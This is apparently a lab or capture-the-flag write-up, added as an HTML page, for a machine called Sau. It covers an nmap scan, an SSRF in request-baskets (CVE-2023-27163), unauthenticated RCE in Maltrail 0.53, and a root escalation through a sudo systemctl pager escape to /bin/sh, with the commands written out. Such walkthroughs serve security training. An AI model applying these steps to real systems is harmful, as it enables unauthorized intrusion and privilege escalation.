@@ -1,0 +1,75 @@
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+  </head>
+  
+  <body>
+    <p>Nmap scan</p>
+    <p>nmap -sV -sC -T4 -p- -oA Sau 10.10.11.224 -v</p>
+    <p>PORT&nbsp; &nbsp; &nbsp; STATE&nbsp; &nbsp; SERVICE&nbsp; &nbsp; &nbsp;
+      VERSION</p>
+    <p>22/tcp&nbsp; &nbsp; open&nbsp; &nbsp; ssh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</p>
+    <p>| ssh-hostkey:</p>
+    <p>|&nbsp; 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)</p>
+    <p>|&nbsp; 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)</p>
+    <p>|_&nbsp; 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)</p>
+    <p>80/tcp&nbsp; &nbsp; filtered http</p>
+    <p>2392/tcp&nbsp; filtered tacticalauth</p>
+    <p>8338/tcp&nbsp; filtered unknown</p>
+    <p>10962/tcp filtered unknown</p>
+    <p>24943/tcp filtered unknown</p>
+    <p>30535/tcp filtered unknown</p>
+    <p>50030/tcp filtered unknown</p>
+    <p>55555/tcp open&nbsp; &nbsp; unknown</p>
+    <p>&nbsp;</p>
+    <hr>
+    <p>
+      <br>Site is very basic, just allows you to send web requests to it and thats
+      about it.
+      <br>&nbsp;</p>
+    <p>The site is using a vulnerable web baskets version which we can find by
+      googling and we find a CVE.
+      <br>&nbsp;</p>
+    <p>Using /<a href="http://CVE-2023-27163.sh">CVE-2023-27163.sh</a> we can
+      forward requests to port 80 so we can access a restricted site(really cool
+      exploit that I didnt know existed) This tricks the webpage into thinking
+      we are local host allowing us to access the website on port 80 which is
+      a closed port.
+      <br>&nbsp;</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/df682cb4-c0b4-efc9-5e0a-0c8e81d7ef85/image.png"
+      alt="">
+    </p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/e170e0c6-2216-57db-3491-9336a89d36c5/image.png"
+      alt="">
+    </p>
+    <p>Site is running <strong>M</strong>altrail (v<strong>0.53</strong>) which
+      has unauth RCE</p>
+    <p>https://www.exploit-db.com/exploits/51676</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/422ebbb6-6d17-6b3b-8aad-aac2d82dc9ae/image.png"
+      alt="">
+      <img src="https://www.evernote.com/shard/s560/res/efb3097b-826d-2aa7-b48d-9dbbff4d3081/image.png"
+      alt="">
+    </p>
+    <p>TF=$(mktemp)</p>
+    <p>echo /bin/sh &gt;$TF</p>
+    <p>chmod +x $TF</p>
+    <p>sudo /usr/bin/systemctl edit system.slice</p>
+    <p>We can run sudo /usr/bin/systemctl status trail.service with no password.</p>
+    <p>In order for this exploit to work we need to downgrade our shell to a
+      non tty</p>
+    <p>Then when we run the command it would typically open a VIM window, in
+      non tty it does not. We can then enter commands as root and drop into a
+      shell with !/bin/sh. The ! is to enter a command, we could also use this
+      to cat root.txt</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/371704fc-5ea9-152f-01b0-af8017fb32c5/image.png"
+      alt="">
+    </p>
+  </body>
+
+</html>
